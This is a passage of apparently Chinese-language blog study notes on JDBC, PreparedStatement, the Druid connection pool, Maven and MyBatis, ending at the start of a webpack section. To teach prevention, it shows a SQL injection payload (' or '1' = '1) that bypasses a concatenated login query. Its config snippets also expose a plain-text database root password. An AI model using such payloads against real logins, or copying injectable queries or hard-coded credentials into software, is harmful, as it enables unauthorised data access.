class="line">    int count = stmt.executeUpdate(sql2);</span><br><span class="line">    //处理结果</span><br><span class="line">    System.out.println(count);</span><br><span class="line">    //提交事务</span><br><span class="line">    conn.commit();</span><br><span class="line">&#125; catch (Exception throwables) &#123;</span><br><span class="line">    //失败则回滚事务</span><br><span class="line">    conn.rollback();</span><br><span class="line">    throwables.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们使用try-catch包裹代码，在try的开始加入开启事务代码，在最后加入提交事务代码</p><p>在失败后回滚事务</p><h3 id="5-Statement"><a href="#5-Statement" class="headerlink" title="5.Statement"></a>5.Statement</h3><p>Statement只有一个作用——那就是执行sql语句</p><h4 id="1-executeUpdate"><a href="#1-executeUpdate" class="headerlink" title="1. executeUpdate"></a>1. executeUpdate</h4><p>这个语句可以实现数据库的增删改查工作，也可以实现新建数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//3.定义sql语句</span><br><span class="line">String sql = &quot;update school set sex = &#x27;female&#x27;&quot;;</span><br><span class="line"></span><br><span class="line">//4.获取sql对象</span><br><span class="line">Statement stmt = conn.createStatement();</span><br><span class="line"></span><br><span class="line">//5.执行sql</span><br><span class="line">int count = stmt.executeUpdate(sql);</span><br></pre></td></tr></table></figure><p>count是数据库中被影响数据的个数</p><h4 id="2-executeQuery"><a href="#2-executeQuery" class="headerlink" title="2.executeQuery"></a>2.executeQuery</h4><p>查询语句就需要使用executeQuery</p><p>但是它执行结果处理不一样，首先执行结果是使用ResultSet类型接收</p><p>如果下一行有效，就打印出来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//5.执行sql</span><br><span class="line">ResultSet result = stmt.executeQuery(sql);</span><br><span class="line"></span><br><span class="line">//6.处理结果</span><br><span class="line">while (result.next())&#123;</span><br><span class="line">    System.out.println(result.getString(1)+&quot;\t&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-PreparedStatement"><a href="#6-PreparedStatement" class="headerlink" title="6.PreparedStatement"></a>6.PreparedStatement</h3><p><code>PreparedStatement</code>用于防止我们的sql注入</p><p>比如我们的登录模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">String name = &quot;whr&quot;;</span><br><span class="line">String pwd = &quot;&#x27; or &#x27;1&#x27; = &#x27;1&quot;;</span><br><span class="line"></span><br><span class="line">//3.定义sql语句</span><br><span class="line">String sql = &quot;select * from school where name= &#x27;&quot;+name+&quot;&#x27; and pwd= &#x27;&quot;+pwd+&quot;&#x27;&quot;;</span><br><span class="line">System.out.println(sql);</span><br></pre></td></tr></table></figure><p>如果sql查询成功，我们就登入成功</p><p>而此时的sql语句是这个样子的，where会得到一个永真的结果，从而查询所有数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from school where name= &#x27;shdfoi&#x27; and pwd= &#x27;&#x27; or &#x27;1&#x27; = &#x27;1&#x27;</span><br></pre></td></tr></table></figure><p>所以我们需要使用我们的<code>PreparedStatement</code>，<strong>参数使用占位符进行替代</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">//用户登录</span><br><span class="line">String name = &quot;whr&quot;;</span><br><span class="line">String pwd = &quot;1230&quot;;</span><br><span class="line"></span><br><span class="line">//3.定义sql语句</span><br><span class="line">String sql = &quot;select * from school where name= ? and pwd= ?&quot;;</span><br><span class="line"></span><br><span class="line">//获取sql对象</span><br><span class="line">PreparedStatement pstmt = conn.prepareStatement(sql);</span><br><span class="line"></span><br><span class="line">//设置？的值</span><br><span class="line">pstmt.setString(1,name);</span><br><span class="line">pstmt.setString(2,pwd);</span><br><span class="line"></span><br><span class="line">//5.执行sql</span><br><span class="line">ResultSet rs = pstmt.executeQuery();</span><br><span class="line"></span><br><span class="line">//6.处理结果</span><br><span class="line">if (rs.next())&#123;</span><br><span class="line">    System.out.println(&quot;login success&quot;);</span><br><span class="line">&#125;else &#123;</span><br><span class="line">    System.out.println(&quot;login defeat&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样就让我们的sql注入失败了，原理其实是对我们语句中的引号和关键字进行了转义，转义之后的语句便不能匹配所有数据了。</p><p>我们还可以开启预编译sql，使得我们的代码性能更高，使用方法是在url后面加入参数</p><p><code>String url = &quot;jdbc:mysql:///db1?useServerPrepStmts=true&quot;;</code></p><h3 id="7-数据库连接池"><a href="#7-数据库连接池" class="headerlink" title="7.数据库连接池"></a>7.数据库连接池</h3><p><img src="https://s2.loli.net/2022/07/14/oGzSLQm71uMYsvJ.png" alt="数据库连接池.png"></p><p>数据库连接池的接口dataSource</p><p>我们使用的数据库连接池是Druid（德鲁伊）</p><p>下载Druid的jar包放在lib中，然后<code>add as lib</code></p><p>然后我们需要在src下新建一个配置文件<code>druid.properties</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">driverClassName = com.mysql.cj.jdbc.Driver</span><br><span class="line">url = jdbc:mysql:///db1</span><br><span class="line">username = root</span><br><span class="line">password = ztdgz947</span><br><span class="line">//初始化连接数量</span><br><span class="line">initalSize = 5</span><br><span class="line">//最大连接数</span><br><span class="line">maxAcitve=10</span><br><span class="line">//最大等待时间</span><br><span class="line">maxWait=3000</span><br></pre></td></tr></table></figure><p>然后写jdbc，注意写<code>prop.load(new FileInputStream(&quot;src/druid.properties&quot;));</code>的时候要注意路径，最好先用<code>System.getProperty(&quot;user.dir&quot;)</code>查看自己的路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">package com.itheima.JDBC;</span><br><span class="line"></span><br><span class="line">import com.alibaba.druid.pool.DruidDataSourceFactory;</span><br><span class="line"></span><br><span class="line">import javax.sql.DataSource;</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.sql.Connection;</span><br><span class="line">import java.util.Properties;</span><br><span class="line"></span><br><span class="line">public class demo_Druid &#123;</span><br><span class="line">    public static void main(String[] args)throws Exception &#123;</span><br><span class="line">        //1.导入jar</span><br><span class="line"></span><br><span class="line">        //2.定义配置文件</span><br><span class="line"></span><br><span class="line">        //3.加载配置文件</span><br><span class="line">        Properties prop = new Properties();</span><br><span class="line">        prop.load(new FileInputStream(&quot;src/druid.properties&quot;));</span><br><span class="line">        //4.获取对象</span><br><span class="line">        DataSource dataSource = DruidDataSourceFactory.createDataSource(prop);</span><br><span class="line">        //5.获取链接</span><br><span class="line">        Connection connection = dataSource.getConnection();</span><br><span class="line">        System.out.println(connection);</span><br><span class="line">//        System.out.println(System.getProperty(&quot;user.dir&quot;)); 用于查看当前路径</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>成功执行的控制台是： 代表连接池中的链接少了一个用于我们的链接</p><p><img src="https://s2.loli.net/2022/09/04/ibVzF2LxdKYEOX6.png" alt="druid.png"></p><h1 id="Maven"><a href="#Maven" class="headerlink" title="Maven"></a>Maven</h1><p>用于构建和管理java项目</p><p>标准化了项目结构，实现多平台运行</p><p><img src="https://s2.loli.net/2022/09/04/XZ2tYnrzFHap7iV.png" alt="maven.png"></p><p>提供一套的依赖管理（jar包等）之前是下载jar，然后加入工作环境</p><p>现在maven只需要写几行代码就可以导入</p><p><img src="https://s2.loli.net/2022/09/04/K83zcaeDJijWgVm.png" alt="maven导入jar包.png"></p><h2 id="1-安装mvn"><a href="#1-安装mvn" class="headerlink" title="1.安装mvn"></a>1.安装mvn</h2><p>安装maven的话参考这个</p><p><img src="https://s2.loli.net/2022/09/04/qGCzBVeUb12pM8m.png" alt="maven配置.png"></p><h2 id="2-mvn命令"><a href="#2-mvn命令" class="headerlink" title="2.mvn命令"></a>2.mvn命令</h2><p>编译在pom.xml处打开控制台</p><p>输入：<code>mvn compile</code></p><p>运行后，开始下载项目所需的依赖，之后生成一个target文件</p><p><code>mvn clean</code> 就会清理掉<code>target</code>文件</p><p><code>mvn package</code>会打包生成target目录，然后里面会有一个打包的jar，里面是我们的字节码文件</p><p><code>mvn test</code>会执行我们的test代码</p><p><code>mvn install</code>会将我们项目打包成jar包并放入本地仓库</p><h2 id="3-maven项目"><a href="#3-maven项目" class="headerlink" title="3.maven项目"></a>3.maven项目</h2><p><img src="https://s2.loli.net/2022/09/04/ZkKvceTqzp5sNt4.png" alt="idea创建maven.png"></p><h3 id="1-新建maven项目"><a href="#1-新建maven项目" class="headerlink" title="1.新建maven项目"></a>1.新建maven项目</h3><p>在新建中寻找module，然后选择maven项目</p><p>创建成功后的文件夹中有src文件夹和pom.xml配置文件</p><p>编译的时候我们需要注意maven的sdk版本和我们使用的sdk版本是否一样，在project中和setting中查看</p><p>或者在pom.xml中加入代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;properties&gt;</span><br><span class="line">    &lt;maven.compiler.source&gt;8&lt;/maven.compiler.source&gt;</span><br><span class="line">    &lt;maven.compiler.target&gt;8&lt;/maven.compiler.target&gt;</span><br><span class="line">&lt;/properties&gt;</span><br></pre></td></tr></table></figure><h3 id="2-导入jar包"><a href="#2-导入jar包" class="headerlink" title="2.导入jar包"></a>2.导入jar包</h3><p>本地仓库有的jar包可以按住<code>alt+fn+insert</code>打开仓库进行搜索导入</p><p>仓库没有的jar包我们就正常填写，填写了之后会自动帮我们下载</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--导入依赖包--&gt;</span><br><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;mysql&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;8.0.29&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><p>还有一个<code>&lt;scope&gt;</code>标签选择我们jar包的作用环境</p><p><img src="https://s2.loli.net/2022/09/04/dLuCGweEtv1UMoy.png" alt="idea配置maven.png"></p><h1 id="mybatis"><a href="#mybatis" class="headerlink" title="mybatis"></a>mybatis</h1><h2 id="1-mybatis简介"><a href="#1-mybatis简介" class="headerlink" title="1.mybatis简介"></a>1.mybatis简介</h2><p>mybatis简化了jdbc的开发，作用于持久层</p><p>javaEE的三层框架：表现层就是页面显示，业务层是逻辑处理，持久层就是数据保存到数据库</p><p><img src="https://s2.loli.net/2022/09/04/rlstNLpg5ZbjeqB.png" alt="mybatis.png"></p><h2 id="2-mybatis快速入门"><a href="#2-mybatis快速入门" class="headerlink" title="2.mybatis快速入门"></a>2.mybatis快速入门</h2><p>mybatis的相关jar我们通过maven安装，以下就下载了mysql，mybatis，Junit(单元测试使用)，logback（日志文件配置）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">    &lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;!--导入mybatis--&gt;</span><br><span class="line">        &lt;groupId&gt;org.mybatis&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;mybatis&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;3.5.5&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;mysql&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;5.1.46&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--        junit单元测试--&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;junit&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;junit&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;4.13&lt;/version&gt;</span><br><span class="line">            &lt;scope&gt;test&lt;/scope&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">&lt;!--        添加日志api--&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.slf4j&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;slf4j-api&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;1.7.28&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;ch.qos.logback&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;logback-classic&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;1.2.3&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;ch.qos.logback&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;logback-core&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;1.2.3&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><p>安装之后在main文件夹的resource下写入sql语句的映射文件，<code>mybatis-config.xml</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">        &lt;!DOCTYPE configuration</span><br><span class="line">                PUBLIC &quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span><br><span class="line">                &quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;&gt;</span><br><span class="line">&lt;configuration&gt;</span><br><span class="line">&lt;environments default=&quot;development&quot;&gt;</span><br><span class="line">    &lt;environment id=&quot;development&quot;&gt;</span><br><span class="line">        &lt;transactionManager type=&quot;JDBC&quot;/&gt;</span><br><span class="line">        &lt;dataSource type=&quot;POOLED&quot;&gt;</span><br><span class="line">            &lt;property name=&quot;driver&quot; value=&quot;com.mysql.jdbc.Driver&quot;/&gt;</span><br><span class="line">            &lt;property name=&quot;url&quot; value=&quot;jdbc:mysql:///mybatis?useSSL = false&quot;/&gt;</span><br><span class="line">            &lt;property name=&quot;username&quot; value=&quot;root&quot;/&gt;</span><br><span class="line">            &lt;property name=&quot;password&quot; value=&quot;ztdgz947&quot;/&gt;</span><br><span class="line">        &lt;/dataSource&gt;</span><br><span class="line">    &lt;/environment&gt;</span><br><span class="line">&lt;/environments&gt;</span><br><span class="line">&lt;mappers&gt;</span><br><span class="line">&lt;!--  映射文件位置--&gt;</span><br><span class="line">    &lt;mapper resource=&quot;UserMapper.xml&quot;/&gt;</span><br><span class="line">&lt;/mappers&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure><p>而<code>UserMapper.xml</code>中就写入对应的sql语句，id是这个查询的唯一标识，resultType是对应的返回数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">        &lt;!DOCTYPE mapper</span><br><span class="line">                PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span><br><span class="line">                &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;</span><br><span class="line">                </span><br><span class="line">        &lt;mapper namespace=&quot;test&quot;&gt;</span><br><span class="line">            &lt;select id=&quot;selectAll&quot; resultType=&quot;com.pojo.User&quot;&gt;</span><br><span class="line">                select * from tb_user;</span><br><span class="line">            &lt;/select&gt;</span><br><span class="line">        &lt;/mapper&gt;</span><br></pre></td></tr></table></figure><p>然后我们在java文件中新建类com.pojo.User，设置返回的类型</p><p>使用<code>alt</code>+<code>fn</code>+<code>insert</code>配置getter，setter和toString</p><p>代码就不一一列举了</p><p>然后写主函数的主要代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">//        1.加载mybatis配置文件，获取sqlSessionFactory</span><br><span class="line">//        定义配置文件路径</span><br><span class="line">        String resource = &quot;mybatis-config.xml&quot;;</span><br><span class="line">        InputStream inputStream = Resources.getResourceAsStream(resource);</span><br><span class="line">        SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(inputStream);</span><br><span class="line"></span><br><span class="line">//        2.获取SQLSession对象，用于执行sql</span><br><span class="line">        SqlSession sqlSession = sqlSessionFactory.openSession();</span><br><span class="line"></span><br><span class="line">//        3，执行sql</span><br><span class="line">//        selectList是使用List封装的result 如果只查询一个就使用selectOne就可以了</span><br><span class="line">        List&lt;User&gt; users = sqlSession.selectList(&quot;test.selectAll&quot;);</span><br><span class="line"></span><br><span class="line">        System.out.println(users);</span><br><span class="line"></span><br><span class="line">//        4.释放资源</span><br><span class="line">        sqlSession.close();</span><br></pre></td></tr></table></figure><h2 id="3-配置mapper代理"><a href="#3-配置mapper代理" class="headerlink" title="3.配置mapper代理"></a>3.配置mapper代理</h2><p><img src="https://s2.loli.net/2022/09/04/COujJv6ZKzA5WGs.png" alt="mapper代理开发.png"></p><p>第一步 _  设置同一目录的同一接口</p><p>com 包下新建一个mapper包，放入我们的接口文件<code>UserMapper</code></p><p>然后在resource中加入一个<code>directory</code>注意路径写成<code>com.mapper</code>也就是和接口文件一样的路径，将<code>UserMapper.xml</code>放入文件夹</p><p>这样子就做到了同一目录下的同名文件</p><p>在UserMapper接口文件中我们写入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">package com.mapper;</span><br><span class="line"></span><br><span class="line">import com.pojo.User;</span><br><span class="line"></span><br><span class="line">import java.util.List;</span><br><span class="line"></span><br><span class="line">public interface UserMapper &#123;</span><br><span class="line">    List&lt;User&gt; selectAll();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后将原来3部分的代码替换为通过接口获取的对象的方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//        3.1 使用接口代理对象获取,getMapper(类型.class)</span><br><span class="line">        UserMapper userMapper = sqlSession.getMapper(UserMapper.class);</span><br><span class="line">//        直接调用userMapper对象的selectAll的接口方法</span><br><span class="line">        List&lt;User&gt; users = userMapper.selectAll();</span><br></pre></td></tr></table></figure><p>最后补充一个包扫描，在<code>mybatis.config.xml</code>中更改<code>mapper</code>配置为<code>package</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;mappers&gt;</span><br><span class="line">&lt;!--    &lt;mapper resource=&quot;UserMapper.xml&quot;/&gt;--&gt;</span><br><span class="line">&lt;!--    使用包扫描的方式,因为对应的配置文件都在com.mapper下--&gt;</span><br><span class="line">    &lt;package name=&quot;com.mapper&quot;/&gt;</span><br><span class="line">&lt;/mappers&gt;</span><br></pre></td></tr></table></figure><h2 id="4-mybatis核心配置"><a href="#4-mybatis核心配置" class="headerlink" title="4.mybatis核心配置"></a>4.mybatis核心配置</h2><p><img src="https://s2.loli.net/2022/09/04/n7CmQgBYqxwLech.png" alt="mybatis核心配置.png"></p><h2 id="5-配置文件完成增删改查"><a href="#5-配置文件完成增删改查" class="headerlink" title="5.配置文件完成增删改查"></a>5.配置文件完成增删改查</h2><p>首先我们需要安装一个叫做<code>MybatisX</code>的插件，他用于便捷我们的xml中statement对应id映射和java接口的切换</p><p>安装之后在映射和接口代码处会出现小鸟，点击小鸟就可以实现切换。写接口代码的时候也可以帮助我们实现补全xml配置代码。</p><h3 id="5-1查询"><a href="#5-1查询" class="headerlink" title="5.1查询"></a>5.1查询</h3><p>我们sql的代码一般80%以上都是查询代码</p><p>第一种我们查询全部数据</p><p>但是在查询的时候常常遇到，表里面的字段名和我们实体类的属性名不一致的情况</p><p>我们使用resultMap解决，实现字段名和属性名的一个统一</p><p><img src="https://s2.loli.net/2022/09/04/1taIz9GgY8LMhVm.png" alt="resultMap.png"></p><p>然后将select语句的<code>resultType</code>替换为<code>resultMap</code>，并保持和resultMap标签中的type一致</p><p>但是，当我们查询需要携带参数的时候。我们就需要</p><p>在接口代码中加入参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User selectById(int id);</span><br></pre></td></tr></table></figure><p>然后在select语句中选择<code>#&#123;&#125;</code>或者<code>$&#123;&#125;</code>(一般因为有sql注入问题不使用)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;select id=&quot;selectById&quot; resultType=&quot;com.pojo.User&quot;&gt;</span><br><span class="line">    select * from tb_user where id = #&#123;id&#125;//#&#123;&#125;会先将里面的文字转换为？，再填值</span><br><span class="line">&lt;/select&gt;</span><br></pre></td></tr></table></figure><p>我们还可以写<code>parameterType</code>字段写入输入类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;select id=&quot;selectById&quot; parameterType=&quot;int&quot; resultType=&quot;com.pojo.User&quot;&gt;</span><br><span class="line">    select * from tb_user where id = #&#123;id&#125;</span><br><span class="line">&lt;/select&gt;</span><br></pre></td></tr></table></figure><p>还有一些特殊字符的问题</p><p>比如<code>&lt;</code>号，xml无法识别</p><p>1.我们可以使用转义字符</p><p><code>select * from tb_user where id &amp;lt; #&#123;id&#125;</code></p><p>2.我们可以使用CDATA区，区域中的文本会被解析成纯文本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select * from tb_user where id </span><br><span class="line"> &lt;![CDATA[</span><br><span class="line">    &lt;</span><br><span class="line"> ]]&gt;</span><br><span class="line"> #&#123;id&#125;</span><br></pre></td></tr></table></figure><p>对于条件查询，多参数查询</p><p>模糊查询可以使用like实现，但是java还是要对参数处理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String Username = &quot;w&quot;;</span><br><span class="line">Username = &quot;%&quot;+Username+&quot;%&quot;;</span><br></pre></td></tr></table></figure><p>这样将参数模糊化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//        直接调用userMapper对象的selectAll的接口方法</span><br><span class="line">        User users = userMapper.selectByName(Username);</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/09/04/RDd7X5NgAHjbuJp.png" alt="条件查询.png"></p><p>有三种方法实现</p><p>第一种是挨个传入，但是需要Param注解对应的是那个参数</p><p>第二种是对象传入，适用于查询的条件全是一个对象里面参数的情况，而且名称要保持一致</p><p>第三种是依靠映射关系查询，map集合的名称也要和参数保持一致</p><p>动态查询</p><p>依靠mybatis中的if和where标签判断和连接</p><p><img src="https://s2.loli.net/2022/09/04/pO2PJutXCjk9Z1l.png" alt="动态查询.png"></p><p>动态单条件查询</p><p>依靠提供的choose标签，对更换的查询条件进行判断</p><p><img src="https://s2.loli.net/2022/09/04/nNr2G7smUqgzRFp.png" alt="动态单条件查询.png"></p><p><code>otherwise</code>标签可以在以上三种条件都不起作用时保底</p>]]></content>
    
    
    
    <tags>
      
      <tag>JDBC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>webpack</title>
    <link href="/2022/06/21/webpack/"/>
    <url>/2022/06/21/webpack/</url>
    
    <content type="html"><![CDATA[<h1 id="webpack基础"><a href="#webpack基础" class="headerlink" title="webpack基础"></a>webpack基础</h1><h2 id="1-webpack的基本使用"><a href="#1-webpack的基本使用" class="headerlink" title="1.webpack的基本使用"></a>1.webpack的基本使用</h2><p>webpack是一个静态资源的打包工具，将一个或者多个文件作为入口文件，然后组合编译成一个或者多个文件输出出去</p><p>现在大多数的打包都是使用的webpack，当然在vue3之后，vue团队还推出了vite作为新型的打包工具</p><p>在打包过程中我们将main.js作为入口文件，在main.js中引入count.js和reduce.js文件</p><p><img src="https://s2.loli.net/2022/06/28/Khl3Z85LxmVsvuH.png" alt="webpack基本使用.png"></p><p>1.第一件事情是初始化webpack——<code>npm init -y</code> 得到一个package.json的文件，需要将里面的name字段改为<code>webpack_code</code></p><p>2.然后安装webpack和相关指令——<code>npm i webpack webpack-cli -D</code></p><p>3.使用<code>npx webpack ./src/main.js --mode=development</code>开始打包（main.js是我们的入口文件，–mode=development代表打包模式为开发模式也可以使用production代表生产模式）</p><p>打包完成后我们会得到一个dist文件夹，dist文件夹下是我们的入口函数main.js，通过在index.html中引入<code>./dist/main.js</code>使用main.js</p><h2 id="2-webpack的基本配置"><a href="#2-webpack的基本配置" class="headerlink" 